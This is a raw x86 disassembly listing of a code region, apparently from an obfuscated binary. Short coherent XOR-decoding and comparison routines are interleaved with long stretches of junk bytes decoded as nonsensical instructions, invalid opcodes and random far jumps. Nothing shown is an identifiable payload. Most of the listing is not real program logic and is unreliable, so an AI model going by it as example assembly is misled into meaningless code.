  407a94:	mov    esp,0xb48674c2
  407a99:	dec    ecx
  407a9a:	sub    eax,0x61ccd9f3
  407a9f:	inc    eax
  407aa0:	lea    edi,[ebx+0x6a]
  407aa3:	sar    DWORD PTR [ecx+ecx*1],1
  407aa6:	aas    
  407aa7:	data16 or al,0x5d
  407aaa:	add    eax,0x899eacb0
  407aaf:	(bad)  
  407ab0:	jnp    0x407a50
  407ab2:	dec    edi
  407ab3:	out    0x6f,al
  407ab5:	aas    
  407ab6:	sbb    cl,bh
  407ab8:	xchg   ebp,eax
  407ab9:	mov    al,ds:0x6e6eef3
  407abe:	mov    esp,0x917bb86f
  407ac3:	jno    0x407aa8
  407ac5:	adc    ecx,DWORD PTR [edx-0x5c]
  407ac8:	adc    dh,BYTE PTR [edx+edx*1+0x1784092c]
  407acf:	daa    
  407ad0:	cmp    al,0xc8
  407ad2:	xchg   esp,eax
  407ad3:	in     al,0x2c
  407ad5:	push   edi
  407ad6:	stos   DWORD PTR es:[edi],eax
  407ad7:	arpl   WORD PTR [edx],sp
  407ad9:	mov    bl,0xd8
  407adb:	retf   
  407adc:	icebp  
  407add:	sahf   
  407ade:	sbb    eax,0x5a322fbc
  407ae3:	repz add bh,BYTE PTR [esi]
  407ae6:	popa   
  407ae7:	and    DWORD PTR [ebp+0x75a223e7],eax
  407aed:	and    eax,0x9b579d81
  407af2:	cmp    al,0xe1
  407af4:	int    0xd
  407af6:	retf   0xfe33
  407af9:	xchg   esp,eax
  407afa:	mov    cl,0xa8
  407afc:	repz cmp DWORD PTR [esi+0x7b17a2aa],eax
  407b03:	hlt    
  407b04:	jecxz  0x407b3f
  407b06:	push   0xffffffc1
  407b08:	add    al,0x14
  407b0a:	mov    bh,0xa8
  407b0c:	jnp    0x407acc
  407b0e:	fcmove st,st(2)
  407b10:	out    dx,al
  407b11:	and    DWORD PTR [ebx+0x406ef4cf],ebx
  407b17:	mov    eax,DWORD PTR [ebp+0x8]
  407b1a:	movzx  eax,WORD PTR [eax+edx*4]
  407b1e:	xor    eax,0x8a40
  407b23:	add    eax,edi
  407b25:	mov    edi,DWORD PTR [ebp-0x14]
  407b28:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407b2c:	mov    eax,DWORD PTR [ebp-0xc]
  407b2f:	inc    edx
  407b30:	cmp    edx,eax
  407b32:	jne    0x407679
  407b38:	pop    edi
  407b39:	pop    ebx
  407b3a:	jmp    0x407cbb
  407b3f:	fistp  QWORD PTR [edi]
  407b41:	aas    
  407b42:	or     bl,bh
  407b44:	or     ch,bl
  407b46:	jmp    0x407b0d
  407b48:	jle    0x407b96
  407b4a:	dec    ebx
  407b4b:	inc    edx
  407b4c:	dec    edi
  407b4d:	fbld   TBYTE PTR [edi+0x7d]
  407b50:	lds    edi,FWORD PTR [esi+0x7e]
  407b53:	sar    BYTE PTR [edi+0x7e],cl
  407b56:	jle    0x407bc1
  407b58:	loope  0x407b36
  407b5a:	pushf  
  407b5b:	js     0x407b24
  407b5d:	mov    ebx,0x62b2a8c6
  407b62:	sbb    BYTE PTR [ebx-0x2b786758],dh
  407b68:	or     bl,al
  407b6a:	push   ebx
  407b6b:	call   0xdfc3:0xcbda8dce
  407b72:	or     eax,0xee866abd
  407b77:	in     eax,dx
  407b78:	pop    ss
  407b79:	cmp    bh,BYTE PTR [ebp+edi*1-0x17]
  407b7d:	inc    eax
  407b7e:	pop    eax
  407b7f:	std    
  407b80:	add    eax,0xf5f0add5
  407b85:	ficomp WORD PTR [eax]
  407b87:	mov    ch,0x77
  407b89:	out    dx,al
  407b8a:	arpl   ax,si
  407b8c:	and    BYTE PTR [ebp+edx*4+0x59],al
  407b90:	(bad)  
  407b91:	cvtpi2ps xmm0,QWORD PTR [ecx+0x1]
  407b95:	fld    TBYTE PTR [ecx]
  407b97:	lods   al,BYTE PTR ds:[esi]
  407b98:	idiv   DWORD PTR [eax*2-0x1256e2bb]
  407b9f:	mov    ds:0xfda4e177,al
  407ba4:	adc    DWORD PTR [esp+esi*4-0x19076364],ebp
  407bab:	adc    dh,BYTE PTR [edi-0x1d5091ce]
  407bb1:	jmp    0x261f:0x365934c1
  407bb8:	rcl    BYTE PTR [esi+0x3f9462c3],cl
  407bbe:	stos   BYTE PTR es:[edi],al
  407bbf:	(bad)  
  407bc0:	fcom   DWORD PTR [edx]
  407bc2:	int3   
  407bc3:	sub    DWORD PTR [edi+0x2976d96b],edi
  407bc9:	lahf   
  407bca:	les    edi,FWORD PTR [ebx]
  407bcc:	dec    edx
  407bcd:	into   
  407bce:	or     BYTE PTR [edi-0x3a],bh
  407bd1:	or     eax,0x80b3641f
  407bd6:	test   al,0x3b
  407bd8:	push   cs
  407bd9:	cli    
  407bda:	imul   ebx,DWORD PTR [esi+0x2a],0x1
  407bde:	mov    ds:0x7bd2d203,al
  407be3:	adc    eax,DWORD PTR [eax]
  407be5:	sbb    BYTE PTR [eax+0x3f],bl
  407be8:	ret    0x3683
  407beb:	test   dl,0x36
  407bee:	push   esi
  407bef:	inc    edi
  407bf0:	push   ecx
  407bf1:	scas   eax,DWORD PTR es:[edi]
  407bf2:	cld    
  407bf3:	enter  0xa66a,0xab
  407bf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bf8:	mov    ebx,0x1b9c6fa0
  407bfd:	dec    ebp
  407bfe:	mov    al,ds:0x404a7a34
  407c03:	loop   0x407b98
  407c05:	(bad)  
  407c06:	jb     0x407c3c
  407c08:	fisttp DWORD PTR [edi-0x5621bb35]
  407c0e:	int    0xb8
  407c10:	ret    0x712b
  407c13:	jp     0x407ba2
  407c15:	(bad)  
  407c16:	mov    ds:0x4b0f21a3,eax
  407c1b:	push   ss
  407c1c:	iret   
  407c1d:	pop    ebp
  407c1e:	clc    
  407c1f:	adc    DWORD PTR [ebx],edi
  407c21:	pop    ecx
  407c22:	mov    edi,0x316a66e5
  407c27:	aaa    
  407c28:	scas   eax,DWORD PTR es:[edi]
  407c29:	lods   eax,DWORD PTR ds:[esi]
  407c2a:	mov    al,ds:0xd0e68739
  407c2f:	call   0xd925:0x66a9b8fe
  407c36:	cmp    DWORD PTR [ebx-0xf],ebp
  407c39:	mov    al,ds:0xf89c9ae7
  407c3e:	outs   dx,BYTE PTR ds:[esi]
  407c3f:	pop    ebp
  407c40:	inc    eax
  407c41:	inc    esp
  407c42:	or     BYTE PTR [edx+0x5575b7f5],0x89
  407c49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c4a:	call   0xe047:0x70549c0f
  407c51:	push   esp
  407c52:	mov    cl,0x49
  407c54:	(bad)  
  407c55:	jo     0x407bf5
  407c57:	cwde   
  407c58:	jp     0x407c76
  407c5a:	push   edi
  407c5b:	(bad)  
  407c5c:	adc    ebp,DWORD PTR [esi+0x1d2c3495]
  407c62:	mov    ah,0x99
  407c64:	pop    edx
  407c65:	xchg   BYTE PTR [esi+0x4b],ah
  407c68:	cmp    eax,DWORD PTR [edx-0x31]
  407c6b:	lea    edi,[edx-0x7c36b4]
  407c71:	push   esp
  407c72:	push   0x9b590fb7
  407c77:	xchg   ebp,eax
  407c78:	xor    BYTE PTR [esi-0x43],cl
  407c7b:	shl    esi,0x43
  407c7e:	push   ds
  407c7f:	jmp    0x36af3b36
  407c84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c85:	in     al,dx
  407c86:	out    dx,al
  407c87:	mov    al,ds:0xd909111
  407c8c:	add    DWORD PTR [ecx],esp
  407c8e:	shl    BYTE PTR ds:0x698824af,1
  407c94:	lock jns 0x407c85
  407c97:	or     BYTE PTR [eax+0x48],ch
  407c9a:	add    eax,0xab12cedb
  407c9f:	sub    dl,BYTE PTR [ebx+0x38]
  407ca2:	ror    BYTE PTR [esi-0x39],cl
  407ca5:	in     al,dx
  407ca6:	adc    BYTE PTR [eax+0x2021c389],dl
  407cac:	enter  0x2dad,0xd3
  407cb0:	cld    
  407cb1:	dec    esi
  407cb2:	and    BYTE PTR [edi+edi*8+0x31],bh
  407cb6:	xchg   edx,eax
  407cb7:	inc    ecx
  407cb8:	cmp    eax,0x458b6b68
  407cbd:	clc    
  407cbe:	mov    edx,DWORD PTR [ebp+0x10]
  407cc1:	xor    eax,ecx
  407cc3:	add    eax,esi
  407cc5:	mov    DWORD PTR [edx],eax
  407cc7:	mov    eax,DWORD PTR [ebp-0x8]
  407cca:	xor    eax,ecx
  407ccc:	add    eax,esi
  407cce:	jmp    0x407e4f
  407cd3:	mov    bh,0xb6
  407cd5:	(bad)  
  407cd6:	ror    DWORD PTR [edi+0x86a7bfb],cl
  407cdc:	dec    ebx
  407cdd:	ror    DWORD PTR [edx],cl
  407cdf:	add    eax,0xd19c7a75
  407ce4:	(bad)  
  407ce5:	jle    0x407d65
  407ce7:	sar    BYTE PTR [edi+0x7e],cl
  407cea:	jle    0x407c7b
  407cec:	dec    ebp
  407ced:	xchg   esp,eax
  407cee:	pop    es
  407cef:	mov    cl,0x59
  407cf1:	or     bh,BYTE PTR [ebp+0x596d6578]
  407cf7:	shl    DWORD PTR [ecx],cl
  407cf9:	cmp    BYTE PTR [ebx],cl
  407cfb:	pusha  
  407cfc:	adc    al,0xd9
  407cfe:	xchg   esi,eax
  407cff:	pop    esi
  407d00:	xor    dl,BYTE PTR [ebx+eiz*1+0x3a]
  407d04:	inc    esp
  407d05:	push   0x463cfd2c
  407d0a:	imul   edx,eax,0x766bb7f5
  407d10:	or     edi,DWORD PTR [ecx+ebx*1-0x1995fb19]
  407d17:	sti    
  407d18:	mov    ch,al
  407d1a:	loopne 0x407cb7
  407d1c:	jno    0x407d18
  407d1e:	dec    edx
  407d1f:	fisub  DWORD PTR [ebx-0x80]
  407d22:	jne    0x407d80
  407d24:	iret   
  407d25:	pop    edx
  407d26:	sahf   
  407d27:	lea    edx,ds:0x11e15e27
  407d2d:	xor    bh,BYTE PTR [ecx-0x12]
  407d30:	ret    
  407d31:	lods   al,BYTE PTR ds:[esi]
  407d32:	mov    ch,0x3e
  407d34:	mov    bh,0xe3
  407d36:	fldenv [edi]
  407d38:	icebp  
  407d39:	inc    ebp
  407d3a:	int3   
  407d3b:	xor    BYTE PTR [esi-0x12d1b3c8],bl
  407d41:	dec    ecx
  407d42:	mov    ds:0x3256c61a,al
  407d47:	mov    edi,DWORD PTR [eax+0x660dda27]
  407d4d:	test   DWORD PTR [edi+0x62],ebp
  407d50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d51:	mov    ebx,0x1ce6cd93
  407d56:	inc    esi
  407d57:	je     0x407d39
  407d59:	jg     0x407d33
  407d5b:	fwait
  407d5c:	xchg   BYTE PTR [eax+0x66],bh
  407d5f:	jge    0x407d68
  407d61:	rcl    BYTE PTR [esi+0x36],cl
  407d64:	retf   
  407d65:	push   edi
  407d66:	test   al,0x68
  407d68:	pop    es
  407d69:	cmp    DWORD PTR [edi-0x70d7f366],0x62
  407d70:	(bad)  
  407d71:	(bad)  
  407d72:	les    esp,FWORD PTR [ecx+0x2ba3cf54]
  407d78:	or     ch,bh
  407d7a:	jmp    0x7033:0xb0a89cd4
  407d81:	shl    BYTE PTR [edx+0x1e],0xb
  407d85:	sar    bh,0x34
  407d88:	inc    esp
  407d89:	xchg   ebx,eax
  407d8a:	div    BYTE PTR [ebx-0xf]
  407d8d:	xchg   esi,eax
  407d8e:	jnp    0x407d1e
  407d90:	xor    esp,ecx
  407d92:	sub    DWORD PTR [eax-0x1a0922d2],ebx
  407d98:	rol    BYTE PTR [ebx-0x13],cl
  407d9b:	mov    al,0x9c
  407d9d:	and    dl,BYTE PTR [esi]
  407d9f:	xor    eax,0x658e87a
  407da4:	pushf  
  407da5:	bound  ebx,QWORD PTR es:[ecx]
  407da8:	or     esp,DWORD PTR [edi+0x18]
  407dab:	xchg   esi,eax
  407dac:	cmp    esp,DWORD PTR es:[ebx]
  407daf:	(bad)  
  407db0:	pop    edi
  407db1:	fnsave [esi]
  407db3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407db4:	mov    ch,0xcd
  407db6:	jne    0x407dbc
  407db8:	cmp    DWORD PTR [ecx+0x34427e76],esi
  407dbe:	and    ah,BYTE PTR [ecx-0x64]
  407dc1:	stos   DWORD PTR es:[edi],eax
  407dc2:	cmp    BYTE PTR [ebx+0x6abe8c12],al
  407dc8:	ja     0x407df8
  407dca:	jmp    0xf7ec:0x98394be
  407dd1:	ds imul esp,ebx,0xffffffd0
  407dd5:	mov    ecx,DWORD PTR [eax]
  407dd7:	lods   eax,DWORD PTR ds:[esi]
  407dd8:	add    dl,al
  407dda:	call   0xb4f1:0xf7d01e1c
  407de1:	pop    edi
  407de2:	or     eax,0x7e35cefe
  407de7:	mov    bl,0xfd
  407de9:	hlt    
  407dea:	jnp    0x407daa
  407dec:	inc    edx
  407ded:	inc    esi
  407dee:	nop
  407def:	stos   BYTE PTR es:[edi],al
  407df0:	adc    esi,ecx
  407df2:	retf   
  407df3:	cmp    BYTE PTR ds:0xde0ac26d,0xdb
  407dfa:	outs   dx,BYTE PTR ds:[esi]
  407dfb:	aam    0xf9
  407dfd:	sti    
  407dfe:	sub    ah,BYTE PTR [eax-0x62]
  407e01:	jge    0x407d99
  407e03:	fisubr WORD PTR [eax]
  407e05:	mov    esi,0xb3dcbd11
  407e0a:	inc    esp
  407e0b:	push   ecx
  407e0c:	imul   ebx,DWORD PTR [ebx],0xfffffff3
  407e0f:	call   0x21a5:0xe21c858f
  407e16:	jmp    FWORD PTR [ebx]
  407e18:	pusha  
  407e19:	jecxz  0x407dbf
  407e1b:	sti    
  407e1c:	mov    es,WORD PTR [ebx+0x4edb7072]
  407e22:	sub    BYTE PTR [edi+0x177b6341],dl
  407e28:	(bad)  
  407e29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e2a:	mov    bh,bl
  407e2c:	test   BYTE PTR [ecx],cl
  407e2e:	or     esp,DWORD PTR [esi+eiz*2-0xb]
  407e32:	dec    edx
  407e33:	add    BYTE PTR [edx+ebp*1+0x4e],dl
  407e37:	push   edx
  407e38:	lods   al,BYTE PTR ds:[esi]
  407e39:	ds das 
  407e3b:	es xchg cl,bl
  407e3e:	sbb    BYTE PTR [ecx-0x1268f672],0xd4
  407e45:	inc    ebx
  407e46:	push   ds
  407e47:	cwde   
  407e48:	fiadd  WORD PTR [ebx]
  407e4a:	sub    al,0x54
  407e4c:	pop    ss
  407e4d:	mov    cl,0xcb
  407e4f:	mov    DWORD PTR [ebp+0x8],eax
  407e52:	mov    eax,DWORD PTR [ebp+0x8]
  407e55:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  407e59:	mov    dl,BYTE PTR [ebp-0x1]
  407e5c:	cmp    al,dl
  407e5e:	je     0x4081a3
  407e64:	mov    eax,DWORD PTR [ebp+0x8]
  407e67:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  407e6b:	mov    edx,DWORD PTR [ebp+0xc]
  407e6e:	cmp    al,BYTE PTR [edx]
  407e70:	jne    0x40834a
  407e76:	mov    eax,DWORD PTR [ebp-0x8]
  407e79:	mov    edx,DWORD PTR [ebp+0xc]
  407e7c:	movsx  edx,BYTE PTR [edx]
  407e7f:	xor    eax,ecx
  407e81:	add    eax,esi
  407e83:	cmp    edx,eax
  407e85:	je     0x40833e
  407e8b:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  407e92:	lea    eax,[ebp-0x18]
  407e95:	jmp    0x408016
  407e9a:	xchg   BYTE PTR [eax],cl
  407e9c:	mov    al,ds:0xb8a6a08e
  407ea1:	or     BYTE PTR [edx],ah
  407ea3:	mov    bl,cl
  407ea5:	mov    dl,0x83
  407ea7:	dec    esp
  407ea8:	in     al,0x97
  407eaa:	mov    ch,0xd8
  407eac:	jle    0x407f2c
  407eae:	sar    BYTE PTR [edi+0x7e],cl
  407eb1:	jle    0x407e99
  407eb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407eb4:	sub    al,0x25
  407eb6:	sub    DWORD PTR [edx+0x6a],0x76cbe27a
  407ebd:	outs   dx,DWORD PTR ds:[esi]
  407ebe:	mov    al,0xa6
  407ec0:	xor    dh,BYTE PTR [edx-0x2399476d]
  407ec6:	adc    eax,0x299b42ae
  407ecb:	js     0x407e81
  407ecd:	gs jb  0x407f4c
  407ed0:	inc    eax
  407ed1:	mov    bl,0x47
  407ed3:	inc    eax
  407ed4:	in     al,dx
  407ed5:	xchg   ebp,eax
  407ed6:	mov    ds:0x7e159482,al
  407edb:	sub    BYTE PTR [esi],0xe7
  407ede:	lock js 0x407ebc
  407ee1:	dec    ebx
  407ee2:	add    bl,dl
  407ee4:	pop    esp
  407ee5:	pop    esi
  407ee6:	mov    DWORD PTR ds:0x23482876,ebp
  407eec:	push   0xc
  407eee:	test   al,0xd8
  407ef0:	push   ds
  407ef1:	fsubr  QWORD PTR [edi]
  407ef3:	(bad)  
  407ef4:	fidiv  WORD PTR [esi+ebp*1]
  407ef7:	mov    WORD PTR [ebx],es
  407ef9:	mov    DWORD PTR [ecx+0x68],ebx
  407efc:	out    dx,al
  407efd:	lock call DWORD PTR [edx-0x5b18db45]
  407f04:	stos   DWORD PTR es:[edi],eax
  407f05:	gs test eax,0xffa89308
  407f0b:	lock scas al,BYTE PTR es:[edi]
  407f0d:	stos   DWORD PTR es:[edi],eax
  407f0e:	add    al,0xc0
  407f10:	dec    esi
  407f11:	icebp  
  407f12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f13:	xchg   ecx,eax
  407f14:	mov    eax,ds:0x16ac242c
  407f19:	mov    ?,WORD PTR [eax+eiz*8+0x1adb867e]
  407f20:	sahf   
  407f21:	cmp    al,0x39
  407f23:	mov    ebp,0x4475e3e
  407f28:	cmc    
  407f29:	mov    ebx,0x791a1dc5
  407f2e:	inc    ecx
  407f2f:	mov    WORD PTR ss:[edx],fs
  407f32:	pop    edi
  407f33:	rcr    DWORD PTR [esi+0x7863a43a],1
  407f39:	(bad)  
  407f3a:	lock sub DWORD PTR fs:[edi],edi
  407f3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f3f:	xor    ebx,DWORD PTR [esi+0x66ab44ed]
  407f45:	add    al,cl
  407f47:	sar    DWORD PTR [edi],1
  407f49:	sub    dl,ch
  407f4b:	(bad)  
  407f4c:	arpl   WORD PTR [ecx-0x76],bx
  407f4f:	sub    dl,BYTE PTR [esi]
  407f51:	sti    
  407f52:	in     al,dx
  407f53:	or     BYTE PTR [esi+0x38d6d155],bh
  407f59:	mov    ebp,0xc2979e9b
  407f5e:	cmp    dh,BYTE PTR [ebx]
  407f60:	popf   
  407f61:	jg     0x407f39
  407f63:	push   eax
  407f64:	xchg   edx,eax
  407f65:	xchg   esi,eax
  407f66:	mov    ecx,0x2f7a1ace
  407f6b:	repz pop esi
  407f6d:	xor    DWORD PTR [ebx],0xc453d5ea
  407f73:	xor    al,0xa9
  407f75:	test   eax,0x2ef43b1b
  407f7a:	sbb    eax,0x9237b43c
  407f7f:	jp     0x407f34
  407f81:	test   eax,0x80b826d1
  407f86:	lea    esp,[edi+0x7d43623d]
  407f8c:	mov    esi,0x782d2bf4
  407f91:	in     al,dx
  407f92:	jge    0x407f5c
  407f94:	jl     0x408011
  407f96:	pusha  
  407f97:	sti    
  407f98:	in     al,0x74
  407f9a:	pop    eax
  407f9b:	and    ah,bl
  407f9d:	leave  
  407f9e:	xchg   edi,eax
  407f9f:	dec    edi
  407fa0:	arpl   dx,dx
  407fa2:	dec    eax
  407fa3:	dec    ebp
  407fa4:	xor    BYTE PTR [edx-0x5f],ah
  407fa7:	xchg   DWORD PTR [esi+0x79],esp
  407faa:	xchg   eax,esp
  407fac:	int    0x2d
  407fae:	xchg   ebx,eax
  407faf:	or     bl,bh
  407fb1:	sti    
  407fb2:	or     al,0x4a
  407fb4:	mov    ds:0xdabbb224,eax
  407fb9:	and    DWORD PTR [ebp-0x15],ebx
  407fbc:	jecxz  0x407ffc
  407fbe:	mov    edi,?
  407fc0:	push   0x63
  407fc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fc3:	push   cs
  407fc4:	ins    BYTE PTR es:[edi],dx
  407fc5:	sub    BYTE PTR [edx+0x35b0c12a],0x66
  407fcc:	push   edx
  407fcd:	mov    ch,0x8e
  407fcf:	add    DWORD PTR [ecx+0x776cbd39],ebx
  407fd5:	repnz sub cl,dl
  407fd8:	sti    
  407fd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fda:	adc    BYTE PTR [edx+0x40576904],ch
  407fe0:	sldt   WORD PTR [ebx-0x3288307d]
  407fe7:	xchg   esi,eax
  407fe8:	fiadd  DWORD PTR [esi+0x50bd9445]
  407fee:	lock scas eax,DWORD PTR es:[edi]
  407ff0:	adc    al,0xcc
  407ff2:	mov    ds:0x6905b487,eax
  407ff7:	mov    WORD PTR [ecx+0x6a6453c5],fs
  407ffd:	inc    edx
  407ffe:	xchg   BYTE PTR [ebx],dh
  408000:	arpl   si,ax
  408002:	jl     0x407fea
  408004:	sar    DWORD PTR [edx],0xee
  408007:	mov    dl,0x99
  408009:	mov    esi,0xb7c1b251
  40800e:	aas    
  40800f:	mov    al,ds:0x37e928ff
  408014:	inc    ecx
  408015:	xchg   edi,eax
  408016:	mov    DWORD PTR [ebp-0x14],eax
  408019:	mov    eax,DWORD PTR [ebp-0x14]
  40801c:	add    DWORD PTR [eax],0x705fa8f
  408022:	jmp    0x4081a3
  408027:	test   al,0x70
  408029:	cmp    ch,BYTE PTR [ecx-0x46]
  40802c:	jge    0x4080ab
  40802e:	xor    DWORD PTR [edx-0x4f],eax
  408031:	imul   esi,DWORD PTR [edx+0x34585830],0x7e7eda29
  40803b:	sar    BYTE PTR [edi+0x7e],cl
  40803e:	jle    0x40807d
  408040:	push   ds
  408041:	xor    edx,DWORD PTR [eax+0x1f]
  408044:	bound  eax,QWORD PTR fs:[ecx+0x3c73e3cb]
  40804b:	mov    eax,ds:0x711d0b0
  408050:	cs test al,0x61
  408053:	mov    ch,bl
  408055:	stos   DWORD PTR es:[edi],eax
  408056:	cli    
  408057:	jg     0x408086
  408059:	sbb    eax,0xaa13c25f
  40805e:	dec    esp
  40805f:	int3   
  408060:	aaa    
  408061:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408062:	pop    edx
  408063:	(bad)  
  408064:	mov    esi,0x19178541
  408069:	retf   
  40806a:	mov    al,ch
  40806c:	hlt    
  40806d:	jmp    0xc001370d
  408072:	pop    ax
  408074:	push   cs
  408075:	mov    al,0x91
  408077:	clc    
  408078:	jae    0x4080d2
  40807a:	dec    ebx
  40807b:	jl     0x4080c1
  40807d:	or     dl,al
  40807f:	in     eax,0xae
  408081:	mov    cl,0xb1
  408083:	test   BYTE PTR [ebx-0x66],dl
  408086:	xor    DWORD PTR [ebp+0x25],ecx
  408089:	aas    
  40808a:	push   ebp
  40808b:	fnop   
  40808d:	pop    ebx
  40808e:	shl    DWORD PTR [edx+0x1a2ab027],cl
  408094:	push   esi
  408095:	call   0x2f06:0x3b1986c5
  40809c:	sar    DWORD PTR ds:0x9f9d6964,0x26
  4080a3:	sar    BYTE PTR [edi+0xe1803ee],cl
  4080a9:	in     eax,dx
  4080aa:	or     DWORD PTR [ebx],edx
  4080ac:	dec    esp
  4080ad:	cmp    DWORD PTR [edx-0x2],esp
  4080b0:	jo     0x4080fa
  4080b2:	icebp  
  4080b3:	outs   dx,DWORD PTR ds:[esi]
  4080b4:	loope  0x4080a9
  4080b6:	scas   eax,DWORD PTR es:[edi]
  4080b7:	nop
  4080b8:	jne    0x408128
  4080ba:	call   0x3afa:0xc115d5e4
  4080c1:	ins    BYTE PTR es:[edi],dx
  4080c2:	sbb    DWORD PTR [eax+0x639e03ed],esp
  4080c8:	cwde   
  4080c9:	add    DWORD PTR [ebp+0x1ecf516b],eax
  4080cf:	cmp    BYTE PTR [esi],bh
  4080d1:	data16 fidiv DWORD PTR [edx+0x6d]
  4080d5:	adc    eax,0x98077dbc
  4080da:	jle    0x408073
  4080dc:	pop    ebp
  4080dd:	aad    0x4d
  4080df:	jmp    0x408155
  4080e1:	jle    0x40810a
  4080e3:	push   es
  4080e4:	out    0x19,eax
  4080e6:	xchg   ecx,eax
  4080e7:	xor    ebx,ecx
  4080e9:	dec    edx
  4080ea:	call   0xaaa2d91b
  4080ef:	das    
  4080f0:	mov    ecx,DWORD PTR [ebp+edx*1-0x68]
  4080f4:	cmp    eax,DWORD PTR [bx+si+0x63]
  4080f8:	test   eax,0xc5073f16
  4080fd:	inc    ebx
  4080fe:	pop    esp
  4080ff:	inc    eax
  408100:	adc    BYTE PTR [edx],dl
  408102:	push   ds
  408103:	push   cs
  408104:	sbb    al,0xf8
  408106:	sub    eax,esi
  408108:	xor    al,0xf0
  40810a:	mov    esp,0xe6dfcdae
  40810f:	mov    BYTE PTR [ebp+0xf],0x13
  408113:	pop    esp
  408114:	adc    eax,0xdd969bcb
  408119:	inc    ecx
  40811a:	aad    0x7d
  40811c:	sahf   
  40811d:	sub    eax,edx
  40811f:	aas    
  408120:	inc    eax
  408121:	jge    0x40813f
  408123:	pop    esi
  408124:	ja     0x408180
  408126:	inc    esp
  408127:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  408129:	and    al,0x75
  40812b:	retf   0xa523
  40812e:	out    0x14,eax
  408130:	outs   dx,DWORD PTR ds:[esi]
  408131:	xchg   edx,eax
  408132:	inc    ebx
  408133:	mov    edi,0xc7cbb455
  408138:	(bad)  
  40813a:	xor    eax,0x6e9683be
  40813f:	xchg   esp,eax
  408140:	(bad)  [esi-0x68f0f0fd]
  408146:	push   ebx
  408147:	mov    ebx,0x48045834
  40814c:	pop    eax
  40814d:	adc    DWORD PTR [edi-0x23],ebp
  408150:	push   ecx
  408151:	scas   eax,DWORD PTR es:[edi]
  408152:	fs inc esi
  408154:	jp     0x40814c
  408156:	outs   dx,BYTE PTR ds:[esi]
  408157:	and    bl,BYTE PTR [ebp+esi*4-0x6a]
  40815b:	test   DWORD PTR [esp+ebp*4-0x4c],ecx
  40815f:	or     ecx,DWORD PTR [eax+0x9]
  408162:	shl    dh,1
  408164:	xchg   DWORD PTR [esi+edx*8],ebx
  408167:	test   BYTE PTR [edi+0x38],bh
  40816a:	(bad)  
  40816d:	or     edi,edx
  40816f:	mov    ecx,ecx
  408171:	jmp    0x4081eb
  408173:	dec    esi
  408174:	test   bh,bl
  408176:	or     edi,DWORD PTR [ebx+0x5d]
  408179:	xlat   BYTE PTR ds:[ebx]
  40817a:	push   ecx
  40817b:	dec    ebp
  40817c:	mov    WORD PTR [edi-0x5c],?
  40817f:	aas    
  408180:	jmp    0xd8e4:0x4cbcc82
  408187:	xchg   esi,eax
  408188:	(bad)  
  40818a:	push   DWORD PTR [edi+0x1d0fafdd]
  408190:	jo     0x4081bf
  408192:	inc    ebx
  408193:	mov    cl,0x8d
  408195:	sub    eax,0x6738caf1
  40819a:	enter  0x39fe,0xe2
  40819e:	pop    edx
  40819f:	sub    BYTE PTR [edx+0x4b],al
  4081a2:	fmul   QWORD PTR [ebx+0x558bf045]
  4081a8:	or     BYTE PTR [ebx],dh
  4081aa:	shr    ecx,0x7c
  4081ad:	add    DWORD PTR [eax],eax
  4081af:	add    BYTE PTR [edx-0x80],cl
  4081b2:	fld    QWORD PTR [edi]
  4081b4:	fstp   QWORD PTR [ebx+0x4c]
  4081b7:	inc    ebp
  4081b8:	inc    eax
  4081b9:	jmp    DWORD PTR [ebp-0x2fbc4471]
  4081bf:	mov    cl,BYTE PTR [ebp-0x2d818125]
  4081c5:	jg     0x408245
  4081c7:	jle    0x40814a
  4081c9:	aaa    
  4081ca:	call   DWORD PTR [edi-0x13a151a6]
  4081d0:	dec    esi
  4081d1:	imul   cx,WORD PTR fs:[eax-0x7e],0xffeb
  4081d7:	jne    0x408191
  4081d9:	jecxz  0x408186
  4081db:	out    0x82,al
  4081dd:	stc    
  4081de:	or     DWORD PTR [edx],ecx
  4081e0:	mov    ah,BYTE PTR [ecx]
  4081e2:	mov    edi,0x5d9ef52e
  4081e7:	jo     0x408254
  4081e9:	pop    ds
  4081ea:	std    
  4081eb:	(bad)  
  4081ec:	xor    edx,edx
  4081ee:	xor    DWORD PTR [edi],ebx
  4081f0:	push   ss
  4081f1:	popa   
  4081f2:	dec    ebx
  4081f3:	stc    
  4081f4:	pushf  
  4081f5:	std    
  4081f6:	jne    0x408243
  4081f8:	pop    esi
  4081f9:	fisttp QWORD PTR [ecx-0x72]
  4081fc:	adc    al,0x9d
  4081fe:	daa    
  4081ff:	mov    ?,WORD PTR [eax]
  408201:	scas   eax,DWORD PTR es:[edi]
  408202:	minps  xmm5,XMMWORD PTR [edi+0x5d]
  408206:	xor    dl,dh
  408208:	iret   
  408209:	dec    esi
  40820a:	inc    ebx
  40820b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40820c:	fwait
  40820d:	sti    
  40820e:	(bad)
  408213:	adc    eax,0xc9d2dba
  408218:	mov    ss,WORD PTR [eax-0x61]
  40821b:	or     al,BYTE PTR [edx-0x8]
  40821e:	xchg   ebx,eax
  40821f:	aas    
  408220:	mov    ds:0x70285052,eax
  408225:	mov    ss,WORD PTR [ebx+0x61]
  408228:	mov    ch,0x40
  40822a:	loope  0x40828b
  40822c:	inc    edx
  40822d:	xor    BYTE PTR [ecx+0x57dd4684],0xd6
  408234:	(bad)  
  408235:	jnp    0x408254
  408237:	sti    
  408238:	cmc    
  408239:	xchg   ecx,eax
  40823a:	std    
  40823b:	into   
  40823c:	dec    esi
  40823d:	aam    0x50
  40823f:	push   esp
  408240:	xchg   BYTE PTR ds:0x49fa90f7,al
  408246:	call   0x6247793a
